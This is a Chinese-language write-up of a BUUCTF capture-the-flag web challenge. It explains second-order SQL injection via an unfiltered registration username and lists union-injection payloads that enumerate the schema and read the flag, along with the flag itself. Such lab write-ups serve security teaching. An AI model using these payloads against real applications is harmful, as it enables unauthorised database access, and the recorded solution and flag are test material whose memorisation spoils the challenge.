---
title: "October 2019 Twice SQL Injection"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [sql-injection, second-order-sqli, union-injection, mysql]
vulnerability: 二次注入 - 注册时用户名未过滤，登录后查询时触发SQL注入
solved: true
flag: "flag{6fc67604-a2bf-4621-840d-7a25941aaf3d}"
---

# October 2019 Twice SQL Injection

## 题目概述
题目是一个简单的登录/注册系统，包含登录、注册和修改个人信息功能。页面注释提示 "October nb!!!!!"。

## 信息收集
1. 访问首页重定向到 `/action=login` 登录页面
2. 有注册功能 `/action=reg`
3. 登录后可以修改个人信息 `/action=change`
4. 题目名称 "Twice SQL Injection" 暗示二次注入

## 漏洞分析（漏洞类型、原理、判断过程）
**漏洞类型**：二次 SQL 注入（Second-Order SQL Injection）

**原理**：
- 用户注册时，用户名被存入数据库，未进行过滤
- 用户登录后，系统根据用户名查询用户信息
- 查询语句类似：`SELECT * FROM users WHERE username = '$username'`
- 当用户名包含 SQL 语句时，在登录后的查询中被执行

**判断过程**：
1. 题目名称 "Twice SQL Injection" 直接提示二次注入
2. 注册时用户名可以包含特殊字符
3. 登录后页面显示用户信息，说明有二次查询

## 利用过程（Payload + Flag）

**步骤1：测试注入点**
```
注册用户名: test' union select 1#
登录后显示: 1
```
确认存在联合注入。

**步骤2：获取数据库名**
```
注册用户名: test' union select database()#
登录后显示: ctftraining
```

**步骤3：获取表名**
```
注册用户名: test' union select group_concat(table_name) from information_schema.tables where table_schema=database()#
登录后显示: flag,news,users
```

**步骤4：获取 flag 表列名**
```
注册用户名: test' union select group_concat(column_name) from information_schema.columns where table_name='flag'#
登录后显示: flag
```

**步骤5：读取 flag**
```
注册用户名: test' union select flag from flag#
登录后显示: flag{6fc67604-a2bf-4621-840d-7a25941aaf3d}
```

## 复现步骤
1. 访问题目 URL，进入注册页面
2. 在用户名处注入 SQL 语句：`test' union select flag from flag#`
3. 使用相同用户名和密码登录
4. 登录后页面显示 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 二次SQL注入 | 注册用户名字段 | `' union select flag from flag#` | 联合注入、information_schema |

## 知识总结（解题技巧、同类题型套路）

**解题技巧**：
1. 题目名称往往直接提示漏洞类型
2. 二次注入关键在于找到数据的"存入"和"取出"两个环节
3. 注册功能是常见的二次注入入口

**同类题型套路**：
- 有注册/登录功能的系统，优先测试二次注入
- 用户名、邮箱等字段是常见注入点
- 测试流程：注入 → 登录 → 触发 → 回显
